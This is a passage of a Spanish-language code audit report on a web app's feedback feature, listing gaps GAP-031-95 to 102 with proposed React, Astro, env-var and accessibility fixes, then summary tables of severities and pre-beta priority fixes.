**Nota:** Refuerza GAP-031-37 de Audit #4, confirmado en lectura directa.

**Solucion propuesta:**
Mover el early return DESPUES de todos los hooks, o separar en un componente wrapper:
```typescript
export function FeedbackFAB(props: FeedbackFABProps) {
    if (!FEEDBACK_CONFIG.enabled) return null;
    return <FeedbackFABInner {...props} />;
}
```

**Recomendacion:** Fix directo. Critico para correctness de React.

---

### GAP-031-96: Env vars FEEDBACK_ENABLED y FEEDBACK_FALLBACK_EMAIL no existen en el API [Audit #7]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Spec violation / Kill switch no funcional

**Descripcion:**
La spec (seccion 8) define 3 env vars:
- `HOSPEDA_LINEAR_API_KEY` - Existe en `apps/api/src/utils/env.ts` linea 248
- `HOSPEDA_FEEDBACK_FALLBACK_EMAIL` - **NO existe** en env.ts
- `HOSPEDA_FEEDBACK_ENABLED` - **NO existe** en env.ts

El fallback email esta hardcodeado en `feedback.config.ts:144` como `'feedback@hospeda.com'` y el kill switch `enabled` esta hardcodeado como `true` en linea 165.

Consecuencias:
1. No se puede cambiar el email de fallback sin un deploy (cambio de codigo)
2. No hay kill switch server-side.. si el sistema tiene problemas, no se puede deshabilitar sin deploy
3. El kill switch client-side (`FEEDBACK_CONFIG.enabled`) solo controla la visibilidad del FAB, no el endpoint API

**Nota:** Refuerza GAP-031-07 de Audit #1 y GAP-031-19 de Audit #2.

**Solucion propuesta:**
1. Agregar a `apps/api/src/utils/env.ts`:
```typescript
HOSPEDA_FEEDBACK_ENABLED: z.string().optional().transform(v => v !== 'false'),
HOSPEDA_FEEDBACK_FALLBACK_EMAIL: z.string().email().optional(),
```
2. En el endpoint, verificar `env.HOSPEDA_FEEDBACK_ENABLED` y retornar 503 si esta deshabilitado.
3. Usar `env.HOSPEDA_FEEDBACK_FALLBACK_EMAIL ?? FEEDBACK_CONFIG.fallbackEmail` para el email.

**Recomendacion:** Fix directo. Importante para operabilidad en produccion.

---

### GAP-031-97: Standalone page usa client:load en vez de client:only="react" [Audit #7]

**Severidad:** MEDIA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Performance / Spec compliance

**Descripcion:**
En `apps/web/src/pages/[lang]/feedback.astro:114`:
```astro
<FeedbackForm client:load ... />
```

La spec (seccion 4.6) dice: "Minimal layout, no heavy JS". `client:load` hace SSR + hydration del componente, lo cual requiere que el servidor pueda renderizar React (mas overhead). La spec busca resiliencia.. si el servidor tiene problemas, la pagina deberia funcionar.

**Nota:** Refuerza GAP-031-72 de Audit #5.

**Solucion propuesta:**
Cambiar a `client:only="react"` para evitar SSR y ser mas resiliente:
```astro
<FeedbackForm client:only="react" ... />
```

**Recomendacion:** Fix directo. Cambio de 1 palabra.

---

### GAP-031-98: FeedbackForm.tsx setState durante render (lineas 438-440) [Audit #7]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** React anti-pattern / Correctness

**Descripcion:**
En `packages/feedback/src/components/FeedbackForm.tsx:438-440`:
```typescript
if (isSuccess && step !== 'success') {
    setStep('success');  // setState during render!
}
```

Esto llama `setStep()` directamente durante el render (no en un useEffect), lo cual causa un re-render inmediato en React 18. Aunque React lo tolera en algunos casos, es un anti-pattern que puede causar bucles infinitos o renders duplicados.

**Nota:** Refuerza GAP-031-16 de Audit #2.

**Solucion propuesta:**
Mover a un `useEffect`:
```typescript
useEffect(() => {
    if (submitState.result !== null && step !== 'success') {
        setStep('success');
    }
}, [submitState.result, step]);
```

**Recomendacion:** Fix directo.

---

### GAP-031-99: Backdrop tiene aria-hidden="true" ocultando todo el modal [Audit #7]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Accesibilidad / WCAG violation

**Descripcion:**
En `packages/feedback/src/components/FeedbackModal.tsx:292`:
```tsx
<div style={backdropStyle} aria-hidden="true" ...>
    <dialog aria-modal="true" ...>
```

El backdrop `div` tiene `aria-hidden="true"`, pero contiene el `<dialog>` con todo el formulario. Esto oculta el formulario completo para lectores de pantalla. El `aria-hidden` deberia estar solo en el backdrop visual, no en el contenedor del dialog.

**Nota:** Refuerza GAP-031-27 de Audit #2.

**Solucion propuesta:**
Quitar `aria-hidden="true"` del div backdrop. El `<dialog aria-modal="true">` ya maneja la semantica modal.

**Recomendacion:** Fix directo. 1 atributo a eliminar.

---

### GAP-031-100: Mobile drawer no tiene boton de cerrar visible [Audit #7]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** UX / Spec compliance

**Descripcion:**
En `FeedbackModal.tsx:345-355`, el boton de cierre (X) solo se renderiza en desktop:
```tsx
{!isMobile && (
    <button style={styles.closeButton} onClick={onClose} ...>
        &#x2715;
    </button>
)}
```

En mobile, solo hay un drag handle visual (linea 338-343) pero NO hay boton de cerrar. La spec (seccion 5.2) dice: "Close button (X) in top-right" sin distinguir mobile/desktop. La unica forma de cerrar en mobile es tap-on-backdrop o Escape.

**Nota:** Refuerza GAP-031-67 de Audit #5.

**Solucion propuesta:**
Renderizar el boton de cierre tanto en mobile como desktop, ajustando su posicion.

**Recomendacion:** Fix directo. Agregar boton de cierre al drawer mobile.

---

### GAP-031-101: withRetry no distingue errores retriable vs non-retriable [Audit #7]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** Correctness / Performance

**Descripcion:**
En `apps/api/src/services/feedback/retry.ts`, el `withRetry` reintenta TODO tipo de error. Si Linear retorna un 400 (Bad Request) o 401 (Unauthorized), no tiene sentido reintentar 3 veces con backoff. Solo errores 5xx o de red deberian reintentarse.

**Nota:** Refuerza GAP-031-51 de Audit #5.

**Solucion propuesta:**
Agregar un parametro `isRetriable` o verificar el status code:
```typescript
if (error instanceof Error && error.message.includes('400')) {
    throw error; // No retry for client errors
}
```

**Recomendacion:** Mejora. No es bloqueante pero reduce tiempos de espera innecesarios.

---

### GAP-031-102: Schemas duplicados entre @repo/feedback y apps/api (Zod v3 vs v4) [Audit #7]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 3
**Categoria:** Mantenibilidad / Deuda tecnica

**Descripcion:**
El esquema de feedback esta definido DOS veces:
1. `packages/feedback/src/schemas/feedback.schema.ts` - usa Zod v3 (dependencia del paquete)
2. `apps/api/src/routes/feedback/submit.ts:32-90` - duplicado manualmente con Zod v4 (dependencia de Hono)

Los comentarios en submit.ts lo reconocen: "mirrors @repo/feedback schemas". Cualquier cambio en los campos, validaciones o limites requiere actualizacion en AMBOS lugares. Si se desalinean, habra validaciones inconsistentes entre cliente y servidor.

**Nota:** Refuerza GAP-031-15 de Audit #1.

**Solucion propuesta:**
A largo plazo, migrar `@repo/feedback` a Zod v4 para compartir schemas, o crear un archivo de constantes compartidas (field names, limits, enums) que ambos schemas importen.

**Recomendacion:** Postergar para una spec de cleanup. No es bloqueante para beta.

---

## Resumen Actualizado Audit #7

### Estadisticas Globales (7 Auditorias)

| Severidad | Total | Criticos | Altos | Medios | Bajos | Muy Bajos |
|-----------|-------|----------|-------|--------|-------|-----------|
| Acumulado | 102 | 7 | 24 | 32 | 37 | 1 |

### Gaps por Auditoria

| Audit | Total | Nuevos | Criticos | Altos | Patron |
|-------|-------|--------|----------|-------|--------|
| #1 | 15 | 15 | 1 | 1 | Cobertura inicial |
| #2 | 15 | 15 | 1 | 4 | Seguridad y sanitizacion |
| #3 | 6 | 6 | 1 | 1 | Bug critico de business logic |
| #4 | 11 | 11 | 1 | 1 | React patterns e injection |
| #5 | 31 | 31 | 3 | 11 | DoS, lifecycle, data leakage |
| #6 | 12 | 12 | 0 | 4 | WCAG, resiliencia, exfiltracion |
| #7 | 12 | 12 | 2 | 3 | Spec compliance, integracion, correctness |

### Gaps que refuerzan/confirman hallazgos previos sin resolver

| Gap Nuevo | Refuerza | Descripcion |
|-----------|----------|-------------|
| GAP-031-91 | GAP-031-31 | Email al reporter en vez del equipo |
| GAP-031-93 | GAP-031-57 | feedbackPageUrl relativa al dominio equivocado |
| GAP-031-94 | GAP-031-32 | Label "beta" nunca aplicado |
| GAP-031-95 | GAP-031-37 | Rules of Hooks violation en FeedbackFAB |
| GAP-031-96 | GAP-031-07, GAP-031-19 | Env vars no registradas, kill switch no funcional |
| GAP-031-97 | GAP-031-72 | client:load vs client:only en standalone |
| GAP-031-98 | GAP-031-16 | setState durante render |
| GAP-031-99 | GAP-031-27 | aria-hidden en backdrop |
| GAP-031-100 | GAP-031-67 | Mobile drawer sin boton cerrar |
| GAP-031-101 | GAP-031-51 | withRetry no filtra errores non-retriable |
| GAP-031-102 | GAP-031-15 | Schemas duplicados Zod v3/v4 |

**11 de 12 gaps de Audit #7 refuerzan hallazgos previos.** Esto indica que las auditorias han convergido: no quedan areas inexploradas significativas. El unico gap genuinamente nuevo es GAP-031-92 (web FAB no recibe datos de sesion del usuario).

### Top Priority Fixes Actualizado (Audit #7)

**Bloqueantes para beta (deben resolverse ANTES de cualquier uso real):**

| # | Gap(s) | Descripcion | Esfuerzo |
|---|--------|-------------|----------|
| 1 | GAP-031-31/91 | **Email fallback al equipo** (no al reporter) | 2 min |
| 2 | GAP-031-37/95 | **Separar FeedbackFAB** para cumplir Rules of Hooks | 10 min |
| 3 | GAP-031-92 | **Pasar datos de sesion al web FAB** (userId, email, name) | 15 min |
| 4 | GAP-031-16/98 | **setState en useEffect** (no en render body) | 5 min |
| 5 | GAP-031-57/93 | **feedbackPageUrl absoluta** en admin | 1 min |
| 6 | GAP-031-27/99 | **Quitar aria-hidden** del backdrop | 1 min |
| 7 | GAP-031-07/96 | **Registrar env vars** FEEDBACK_ENABLED y FALLBACK_EMAIL | 15 min |
| 8 | GAP-031-49 | **Body size limit** antes de formData() parse | 5 min |
| 9 | GAP-031-79 | **Restaurar focus indicators** (WCAG 2.4.7) | 30 min |
| 10 | GAP-031-85 | **Wrapear FeedbackFAB** en admin con error boundary | 10 min |
| 11 | GAP-031-18 | **Sanitizar reporterEmail** | 2 min |
| 12 | GAP-031-38 | **Escape Markdown** en campos de usuario para Linear | 1 hora |
| 13 | GAP-031-12 | **Configurar Linear IDs** reales | 30 min manual |
| 14 | GAP-031-67/100 | **Agregar boton cerrar** al mobile drawer | 10 min |

**Esfuerzo total estimado: ~4 horas** para pasar de "no apto" a "funcional para beta".

**Mejoras recomendadas post-beta (no bloqueantes):**

| # | Gap(s) | Descripcion | Recomendacion |
|---|--------|-------------|---------------|
| 1 | GAP-031-48 | SSRF en presigned URL | Spec nueva de hardening |
| 2 | GAP-031-50 | Buffers de archivos en memoria | Spec nueva de streaming |
| 3 | GAP-031-01 | Archivos > 500 lineas | PR de refactor |
| 4 | GAP-031-15/102 | Schemas duplicados Zod v3/v4 | Spec de migracion Zod |
| 5 | GAP-031-51/101 | withRetry sin filtro de errores | Fix incremental |
| 6 | GAP-031-46 | Tests E2E reales con Playwright | Tasks T-039 a T-045 |
